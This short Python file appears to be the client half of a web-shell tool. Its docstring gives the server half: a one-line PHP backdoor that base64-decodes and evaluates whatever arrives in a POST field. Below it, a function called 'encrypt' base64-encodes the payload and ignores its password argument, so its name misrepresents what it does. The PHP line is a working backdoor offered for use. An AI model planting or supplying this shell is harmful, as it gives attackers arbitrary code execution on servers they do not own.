# coding=utf-8

"""
server:
<?php eval(base64_decode($_POST['a']));?>
"""
import base64


def encrypt(postdata, pwd):
    return bytes.decode(base64.b64encode(str.encode(postdata)))
